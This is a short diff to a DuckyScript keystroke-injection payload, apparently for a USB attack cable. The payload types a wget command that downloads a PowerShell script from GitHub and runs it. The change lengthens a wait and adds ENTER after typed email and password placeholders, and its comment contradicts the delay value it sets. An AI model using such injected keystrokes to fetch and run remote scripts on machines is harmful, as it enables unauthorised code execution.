@@ -14,11 +14,10 @@ STRING wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/
 ENTER
 STRING ./install_python.ps1
 ENTER
-DELAY 10000
-DELAY 10000
-DELAY 10000
-DELAY 10000
-DELAY 10000
+REM 2 mins, seconds, note that ducky is limited to 10000 ms
+DELAY 140000
 STRING emailhere
+ENTER
 DELAY 2000
 STRING passwordhere
+ENTER
